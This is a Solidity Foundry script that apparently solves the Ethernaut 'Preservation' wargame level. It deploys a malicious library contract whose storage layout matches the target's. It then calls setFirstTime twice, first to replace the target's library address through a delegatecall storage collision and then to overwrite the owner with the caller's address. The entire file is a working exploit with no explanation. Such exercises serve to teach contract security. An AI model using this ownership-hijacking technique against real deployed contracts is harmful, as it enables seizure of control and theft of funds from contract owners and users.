// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/levels/Preservation/Preservation.sol";
import "forge-std/Script.sol";

contract PreservationAttackScript is Script {
    function setUp() public {}

    function run() public {
        Preservation target = Preservation(payable(0xD7F3b00DA629Daa6bE86cFC49f1E71903EB91840)); // Insert instance target address

        vm.startBroadcast();

        MaliciousLibraryContract maliciousLibrary = new MaliciousLibraryContract();
        target.setFirstTime(uint256(uint160(address(maliciousLibrary))));
        target.setFirstTime(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}

contract MaliciousLibraryContract {
   // public library contracts
    address public _gap0;
    address public _gap1;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}